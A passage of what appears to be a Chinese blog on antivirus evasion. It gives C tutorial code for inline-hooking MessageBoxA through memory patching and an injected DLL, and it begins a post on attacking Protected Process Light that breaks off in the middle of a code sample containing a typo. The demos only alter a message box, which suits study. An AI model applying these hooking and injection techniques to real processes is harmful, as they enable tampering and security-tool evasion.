        <h1 id="Inline-Hook"><a href="#Inline-Hook" class="headerlink" title="Inline Hook"></a>Inline Hook</h1><p>我们之前提到过SSDT Hook IAT Hook等，这种Hook需要基于 这些SSDT，IAT这些表的Hook</p>
<p>但是如果我们需要找一些未导出的函数，那么就很难去进行Hook，这就引出了另一种Hook，也就是在代码里面Hook，InlineHook</p>
<p>API函数都都由操作系统所提供的DLL文件中引来，当在使用某个API函数时，在运行程序后，程序会主动把API所需的DLL链接进入进程中，这样，程序就会像调用自己的函数一样调用API</p>
<p>这些在DLL文件中的函数，在加载的时候以写拷贝的权限在进程中申请内存。既然这些代码有对应的二进制形式，那么我们就可以用一种简单粗暴的方式来直接修改API函数在内存中的映像，从而对这些函数进行Hook。</p>
<h2 id="研究"><a href="#研究" class="headerlink" title="研究"></a>研究</h2><p>我们核心的思路就是修改一块内存中的汇编，让程序的执行流按照我们希望的方式来进行</p>
<p>在x86下，我们有两种办法进行跳转</p>
<h3 id="jmp-立即数"><a href="#jmp-立即数" class="headerlink" title="jmp 立即数"></a>jmp 立即数</h3><p>要实现jmp跳转，比如我们需要跳转到0x12345678，这对应的需要的字节数就是 5</p>
<p><img src="C:\Users\su\AppData\Roaming\Typora\typora-user-images\image-20241008080707429.png" alt="image-20241008080707429"></p>
<p>xdbg给出的汇编是 E9 6E45159D，E9是我们的跳跃指令，我们打开计算器</p>
<p><strong>E9编码后面的地址 &#x3D; 目标地址 - （ E9语句地址 + 5 ）</strong></p>
<p><img src="C:\Users\su\AppData\Roaming\Typora\typora-user-images\image-20241008082157195.png" alt="image-20241008082157195"></p>
<h2 id="mov-eax，jmp-eax"><a href="#mov-eax，jmp-eax" class="headerlink" title="mov eax，jmp eax"></a>mov eax，jmp eax</h2><p>还可以用这种先把跳转地址存到一个寄存器里面，然后jmp跳到这个寄存器所指向的地址</p>
<p>这种方法需要七个字节</p>
<p><img src="C:\Users\su\AppData\Roaming\Typora\typora-user-images\image-20241008082909819.png" alt="image-20241008082909819"></p>
<h2 id="填充"><a href="#填充" class="headerlink" title="填充"></a>填充</h2><p>讲完了跳走，我们应该思考一个问题，在上面我们强调两种编码方式所占的字节数，是因为我们在Hook的时会修改内存硬编码，比如两行内存的硬编码一共10字节，我们采用第二种方式来进行Hook这时候，会有三个原本的字节我们没有改</p>
<p><img src="C:\Users\su\AppData\Roaming\Typora\typora-user-images\image-20241008084215223.png" alt="image-20241008084215223"></p>
<p>这时候就需要我们用NOP指令去填充这些字节</p>
<h2 id="恢复"><a href="#恢复" class="headerlink" title="恢复"></a>恢复</h2><p>在jmp到我们期望的区域执行完代码后，我们还应该恢复原本被Hook去代码的操作，因为很多操作（比如寄存器的移位置位）哪怕不涉及堆栈平衡，如果贸然删去，也会给程序带来执行问题</p>
<h2 id="流程示意"><a href="#流程示意" class="headerlink" title="流程示意"></a>流程示意</h2><p><img src="C:\Users\su\AppData\Roaming\Typora\typora-user-images\image-20241008085437276.png" alt="image-20241008085437276"></p>
<h1 id="x86小demo"><a href="#x86小demo" class="headerlink" title="x86小demo"></a>x86小demo</h1><p>下面这个demo简单实现了跳转的过程，但是没有恢复正常执行流的过程，因为我们是在调用了函数之后Hook</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Inlinehook.cpp : 此文件包含 &quot;main&quot; 函数。程序执行将在此处开始并结束。</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;tchar.h&gt;</span></span></span><br><span class="line">BYTE NewCode[<span class="number">7</span>] = &#123; <span class="number">0xE9</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span> &#125;;</span><br><span class="line">BYTE OldCode[<span class="number">7</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">FARPROC MessageBoxAddress;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> WINAPI <span class="title function_">MyMessageBoxA</span><span class="params">(HWND hWnd, LPCTSTR lpText, LPCTSTR lpCaption, UINT uType)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;MessageBoxA 已经被Hook\n&quot;</span>);</span><br><span class="line">	WriteProcessMemory(INVALID_HANDLE_VALUE, (<span class="type">void</span>*)MessageBoxAddress,</span><br><span class="line">		(<span class="type">void</span>*)OldCode, <span class="number">7</span>, <span class="literal">NULL</span>);</span><br><span class="line">	<span class="type">int</span> ret = MessageBoxA(<span class="literal">NULL</span>, <span class="string">&quot;1&quot;</span>, <span class="string">&quot;1&quot;</span>, MB_OK);</span><br><span class="line">	WriteProcessMemory(INVALID_HANDLE_VALUE, (<span class="type">void</span>*)MessageBoxAddress,</span><br><span class="line">		(<span class="type">void</span>*)NewCode, <span class="number">7</span>, <span class="literal">NULL</span>);</span><br><span class="line">	<span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">InlineHook</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	HMODULE hModule_User32 = LoadLibrary(<span class="string">L&quot;user32.dll&quot;</span>);</span><br><span class="line">	MessageBoxAddress = GetProcAddress(hModule_User32, <span class="string">&quot;MessageBoxA&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;MessageBoxA Addr is %x\n&quot;</span>, MessageBoxAddress);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;MyMessageBoxA Addr is %x\n&quot;</span>, MyMessageBoxA);</span><br><span class="line">	<span class="keyword">if</span> (ReadProcessMemory(INVALID_HANDLE_VALUE, MessageBoxAddress, OldCode, <span class="number">7</span>,</span><br><span class="line">		<span class="literal">NULL</span>) == <span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;ReadProcessMemory error\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;OldCode is %x%x%x%x%x%x%x\n&quot;</span>, OldCode[<span class="number">0</span>], OldCode[<span class="number">1</span>], OldCode[<span class="number">2</span>],</span><br><span class="line">		OldCode[<span class="number">3</span>], OldCode[<span class="number">4</span>], OldCode[<span class="number">5</span>], OldCode[<span class="number">6</span>]);</span><br><span class="line">	DWORD JmpAddress = (DWORD)MyMessageBoxA;</span><br><span class="line">	NewCode[<span class="number">0</span>] = <span class="number">0xB8</span>;</span><br><span class="line">	<span class="built_in">memcpy</span>(&amp;NewCode[<span class="number">1</span>], &amp;JmpAddress, <span class="number">4</span>);</span><br><span class="line">	NewCode[<span class="number">5</span>] = <span class="number">0xFF</span>;</span><br><span class="line">	NewCode[<span class="number">6</span>] = <span class="number">0xE0</span>;</span><br><span class="line">	DWORD dwOldProtect = <span class="number">0</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;NewBytes is %x%x%x%x%x\n&quot;</span>, NewCode[<span class="number">0</span>], NewCode[<span class="number">1</span>], NewCode[<span class="number">2</span>],</span><br><span class="line">		NewCode[<span class="number">3</span>], NewCode[<span class="number">4</span>], NewCode[<span class="number">5</span>], NewCode[<span class="number">6</span>]);</span><br><span class="line">	::VirtualProtect(MessageBoxAddress, <span class="number">7</span>, PAGE_EXECUTE_READWRITE,</span><br><span class="line">		&amp;dwOldProtect);</span><br><span class="line">	WriteProcessMemory(INVALID_HANDLE_VALUE, MessageBoxAddress, NewCode, <span class="number">7</span>,</span><br><span class="line">		<span class="literal">NULL</span>);</span><br><span class="line">	::VirtualProtect(MessageBoxAddress, <span class="number">7</span>, dwOldProtect, &amp;dwOldProtect);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	InlineHook();</span><br><span class="line"></span><br><span class="line">	MessageBoxA(<span class="literal">NULL</span>, <span class="string">&quot;Hello World&quot;</span>, <span class="string">&quot;Title&quot;</span>, MB_OK);</span><br><span class="line"></span><br><span class="line">	MessageBoxA(<span class="literal">NULL</span>, <span class="string">&quot;Hello World&quot;</span>, <span class="string">&quot;Title&quot;</span>, MB_OK);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>比如我们看见这一次运行几个地址如下</p>
<p><img src="C:\Users\su\AppData\Roaming\Typora\typora-user-images\image-20241008093309973.png" alt="image-20241008093309973"></p>
<p>打开原函数MessageBox首地址，可以看见这里已经被替换成了b8 40 10 95 00 也就是我们需要让他跳转的地址0x00951040,b8是定长指令，之后也接了一个e0 ff（jmp eax）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MOV EAX, imm32</span><br></pre></td></tr></table></figure>

<p><img src="C:\Users\su\AppData\Roaming\Typora\typora-user-images\image-20241008093501675.png" alt="image-20241008093501675"></p>
<p>这时候只要后面凡是在这个进程中调用MessageBox，都会到我们所指向的地址去执行</p>
<p><img src="C:\Users\su\AppData\Roaming\Typora\typora-user-images\image-20241008093928697.png" alt="image-20241008093928697"></p>
<h1 id="DLL化"><a href="#DLL化" class="headerlink" title="DLL化"></a>DLL化</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;pch.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">BOOL <span class="title function_">HookApi_MessageBoxA</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line">BOOL <span class="title function_">UnhookApi_MessageBoxA</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">int</span> <span class="params">(WINAPI* OldMessageBoxA_t)</span><span class="params">(</span></span><br><span class="line"><span class="params">    HWND hWnd,</span></span><br><span class="line"><span class="params">    LPCSTR lpText,</span></span><br><span class="line"><span class="params">    LPCSTR lpCaption,</span></span><br><span class="line"><span class="params">    UINT uType</span></span><br><span class="line"><span class="params">    )</span>;</span><br><span class="line"></span><br><span class="line">OldMessageBoxA_t g_pOriginalMessageBoxA = <span class="literal">NULL</span>;</span><br><span class="line">BYTE g_pOldData[<span class="number">12</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> WINAPI <span class="title function_">NewMessageBoxA</span><span class="params">(</span></span><br><span class="line"><span class="params">    HWND hWnd,</span></span><br><span class="line"><span class="params">    LPCSTR lpText,</span></span><br><span class="line"><span class="params">    LPCSTR lpCaption,</span></span><br><span class="line"><span class="params">    UINT uType</span></span><br><span class="line"><span class="params">)</span> &#123;</span><br><span class="line">    UnhookApi_MessageBoxA();</span><br><span class="line">    <span class="type">int</span> iRet = g_pOriginalMessageBoxA(hWnd, <span class="string">&quot;Hooked!&quot;</span>, <span class="string">&quot;Hooked!&quot;</span>, MB_YESNO);</span><br><span class="line">    HookApi_MessageBoxA();</span><br><span class="line">    <span class="keyword">return</span> iRet;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">BOOL <span class="title function_">HookApi_MessageBoxA</span><span class="params">()</span> &#123;</span><br><span class="line">    HMODULE hDll = GetModuleHandleA(<span class="string">&quot;user32.dll&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">NULL</span> == hDll) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;GetModuleHandleError:%d\n&quot;</span>, GetLastError());</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    g_pOriginalMessageBoxA = (OldMessageBoxA_t)GetProcAddress(hDll, <span class="string">&quot;MessageBoxA&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">NULL</span> == g_pOriginalMessageBoxA) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;GetProcAddressError:%d\n&quot;</span>, GetLastError());</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> _WIN64</span></span><br><span class="line">    BYTE pNewData[<span class="number">5</span>] = &#123; <span class="number">0xE9</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span> &#125;;</span><br><span class="line">    DWORD dwNewDataSize = <span class="number">5</span>;</span><br><span class="line">    DWORD dwOffset = (DWORD)NewMessageBoxA - ((DWORD)g_pOriginalMessageBoxA + <span class="number">5</span>);</span><br><span class="line">    ::RtlCopyMemory(&amp;pNewData[<span class="number">1</span>], &amp;dwOffset, <span class="keyword">sizeof</span>(dwOffset));</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">    BYTE pNewData[<span class="number">12</span>] = &#123; <span class="number">0x48</span>, <span class="number">0xB8</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0xFF</span>, <span class="number">0xE0</span> &#125;;</span><br><span class="line">    DWORD dwNewDataSize = <span class="number">12</span>;</span><br><span class="line">    ULONGLONG ullNewFuncAddr = (ULONGLONG)NewMessageBoxA;</span><br><span class="line">    ::RtlCopyMemory(&amp;pNewData[<span class="number">2</span>], &amp;ullNewFuncAddr, <span class="keyword">sizeof</span>(ullNewFuncAddr));</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">    DWORD dwOldProtect = <span class="number">0</span>;</span><br><span class="line">    VirtualProtect((LPVOID)g_pOriginalMessageBoxA, dwNewDataSize, PAGE_EXECUTE_READWRITE, &amp;dwOldProtect);</span><br><span class="line">    ::RtlCopyMemory(g_pOldData, g_pOriginalMessageBoxA, dwNewDataSize);</span><br><span class="line">    ::RtlCopyMemory(g_pOriginalMessageBoxA, pNewData, dwNewDataSize);</span><br><span class="line">    VirtualProtect((LPVOID)g_pOriginalMessageBoxA, dwNewDataSize, dwOldProtect, &amp;dwOldProtect);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">BOOL <span class="title function_">UnhookApi_MessageBoxA</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (g_pOriginalMessageBoxA == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> _WIN64</span></span><br><span class="line">    DWORD dwNewDataSize = <span class="number">5</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">    DWORD dwNewDataSize = <span class="number">12</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    DWORD dwOldProtect = <span class="number">0</span>;</span><br><span class="line">    VirtualProtect((LPVOID)g_pOriginalMessageBoxA, dwNewDataSize, PAGE_EXECUTE_READWRITE, &amp;dwOldProtect);</span><br><span class="line">    ::RtlCopyMemory(g_pOriginalMessageBoxA, g_pOldData, dwNewDataSize);</span><br><span class="line">    VirtualProtect((LPVOID)g_pOriginalMessageBoxA, dwNewDataSize, dwOldProtect, &amp;dwOldProtect);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">BOOL APIENTRY <span class="title function_">DllMain</span><span class="params">(HMODULE hModule,</span></span><br><span class="line"><span class="params">    DWORD  ul_reason_for_call,</span></span><br><span class="line"><span class="params">    LPVOID lpReserved</span></span><br><span class="line"><span class="params">)</span> &#123;</span><br><span class="line">    <span class="keyword">switch</span> (ul_reason_for_call) &#123;</span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_ATTACH:</span><br><span class="line">        HookApi_MessageBoxA();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_DETACH:</span><br><span class="line">        UnhookApi_MessageBoxA();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>把这个DLL注入到一个用于测试的进程中</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;tchar.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> _tmain(<span class="type">int</span> argc, _TCHAR* argv[]) &#123;</span><br><span class="line">	<span class="type">char</span> szText[] = <span class="string">&quot;World&quot;</span>;</span><br><span class="line">	<span class="type">char</span> szCaption[] = <span class="string">&quot;Hello&quot;</span>;</span><br><span class="line">	MessageBoxA(<span class="literal">NULL</span>, szText, szCaption, MB_OK);</span><br><span class="line">	system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">	MessageBoxA(<span class="literal">NULL</span>, szText, szCaption, MB_OK);</span><br><span class="line">	system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这是 没被Hook之前</p>
<p><img src="C:\Users\su\AppData\Roaming\Typora\typora-user-images\image-20241008114438965.png" alt="image-20241008114438965"></p>
<p><img src="C:\Users\su\AppData\Roaming\Typora\typora-user-images\image-20241008114510950.png" alt="image-20241008114510950"></p>
<p>注入</p>
<p><img src="C:\Users\su\AppData\Roaming\Typora\typora-user-images\image-20241008114537152.png" alt="image-20241008114537152"></p>
<p>可以看见成功注入</p>
<p><img src="C:\Users\su\AppData\Roaming\Typora\typora-user-images\image-20241008114601506.png" alt="image-20241008114601506"></p>
<p>这时候函数的执行流已经被我们Hook，弹出了和源代码不一样的框</p>
<p><img src="C:\Users\su\AppData\Roaming\Typora\typora-user-images\image-20241008114857110.png" alt="image-20241008114857110"></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2024/10/08/%E5%85%8D%E6%9D%80/Inline%20Hook/" data-id="cm1zwlrfl0005u0v69ffnfwmg" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-免杀/PPL Attack" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2024/10/08/%E5%85%8D%E6%9D%80/PPL%20Attack/" class="article-date">
  <time class="dt-published" datetime="2024-10-08T03:50:54.556Z" itemprop="datePublished">2024-10-08</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="PPL"><a href="#PPL" class="headerlink" title="PPL"></a>PPL</h1><p>  Windows Vista &#x2F; Server 2008引入 了受保护进程的概念，其目的不是保护您的数据或凭据。其最初目标是保护媒体内容并符合DRM （数字版权管理）要求。Microsoft开发了此机制，以便您的媒体播放器可以读取例如蓝光，同时 防止您复制其内容。当时的要求是映像文件（即可执行文件）必须使用特殊的Windows Media证 书进行数字签名（如Windows Internals的“受保护的过程”部分所述）。</p>
<p>  在实践中，<strong>一个受保护的过程可通过未保护的过程仅具有非常有限的权限访问</strong>： PROCESS_QUERY_LIMITED_INFORMATION ， PROCESS_SET_LIMITED_INFORMATION ， PROCESS_TERMINATE 和 PROCESS_SUSPEND_RESUME 。对于某些高度敏感的过程，甚至可以减少 此设置。</p>
<p>  从Windows 8.1 &#x2F; Server 2012 R2开始，Microsoft引入了Protected Process Light的概 念。PPL实际上是对先前“受保护过程”模型的扩展，并添加了“保护级别”的概念，这基本上意味着 某些PP（L）进程可以比其他进程受到更多保护</p>
<p>进程保护的级别是会被添加到EPROCESS的内核结构中，并且具体存储再其Protection成员中。该protection成员是一个PS_PROTECTION结构</p>
<p>这个_PS_PROTECTION 结构如下，前3位代表保护 Type ，它定义过程是 PP 还是 PPL ，后4位代表 Signer 类 型，即实际的保护类型</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">PS_PROTECTION</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">UCHAR Level;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">UCHAR Type : <span class="number">3</span>;</span><br><span class="line">UCHAR Audit : <span class="number">1</span>; <span class="comment">// Reserved</span></span><br><span class="line">UCHAR Signer : <span class="number">4</span>;</span><br><span class="line">&#125;;</span><br><span class="line">&#125;;</span><br><span class="line">&#125; PS_PROTECTION, *PPS_PROTECTION;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>对于这个结构来说，前3位代表保护 Type ，它定义过程是 PP 还是 PPL ，后4位代表 Signer 类 型，即实际的保护类型</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">enum</span> _<span class="title">PS_PROTECTED_TYPE</span> &#123;</span></span><br><span class="line">	PsProtectedTypeNone = <span class="number">0</span>,</span><br><span class="line">	PsProtectedTypeProtectedLight = <span class="number">1</span>,</span><br><span class="line">	PsProtectedTypeProtected = <span class="number">2</span></span><br><span class="line">&#125; PS_PROTECTED_TYPE, *PPS_PROTECTED_TYPE;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">enum</span> _<span class="title">PS_PROTECTED_SIGNER</span> &#123;</span></span><br><span class="line">	PsProtectedSignerNone = <span class="number">0</span>, <span class="comment">// 0</span></span><br><span class="line">	PsProtectedSignerAuthenticode, <span class="comment">// 1</span></span><br><span class="line">	PsProtectedSignerCodeGen, <span class="comment">// 2</span></span><br><span class="line">	PsProtectedSignerAntimalware, <span class="comment">// 3</span></span><br><span class="line">	PsProtectedSignerLsa, <span class="comment">// 4</span></span><br><span class="line">	PsProtectedSignerWindows, <span class="comment">// 5</span></span><br><span class="line">	PsProtectedSignerWinTcb, <span class="comment">// 6</span></span><br><span class="line">	PsProtectedSignerWinSystem, <span class="comment">// 7</span></span><br><span class="line">	PsProtectedSignerApp, <span class="comment">// 8</span></span><br><span class="line">	PsProtectedSignerMax <span class="comment">// 9</span></span><br><span class="line">&#125; PS_PROTECTED_SIGNER, *PPS_PROTECTED_SIGNER;</span><br></pre></td></tr></table></figure>

<p>进程的保护级别就通过上面这两个值的组和来定义</p>
<p><img src="C:\Users\su\AppData\Roaming\Typora\typora-user-images\image-20241004090544285.png" alt="image-20241004090544285"></p>
<p>由此，借助API ZwQueryInformationProcess 我们就可以判断进程的PPL保护等级</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">bool</span> <span class="title function_">FindProcessProtect</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	PS_PROTECTION ProtectInfo = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">	NTSTATUS ntStatus = ZwQueryInformationProcess(NtCurrentProcess(),</span><br><span class="line">	ProcessProtectionInformation, &amp;ProtectInfo, <span class="keyword">sizeof</span>(ProtectInfo), <span class="literal">NULL</span>);</span><br><span class="line">	<span class="type">bool</span> = <span class="literal">false</span>;</span><br><span class="line">	<span class="type">bool</span> Result2 = <span class="literal">false</span>;</span><br><span class="line">	<span class="keyword">if</span> (NT_SUCCESS(ntStatus))</span><br><span class="line">	&#123;</span><br><span class="line">		Result1 = ProtectInfo.Type == PsProtectedTypeNone &amp;&amp; ProtectInfo.Signer == PsProtectedSignerNone;</span><br><span class="line">		PROCESS_EXTENDED_BASIC_INFORMATION ProcessExtenedInfo = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">		ntStatus = ZwQueryInformationProcess(NtCurrentProcess(),</span><br><span class="line">		ProcessBasicInformation, &amp;ProcessExtenedInfo, <span class="keyword">sizeof</span>(ProcessExtenedInfo), <span class="literal">NULL</span>);</span><br><span class="line">	<span class="keyword">if</span> 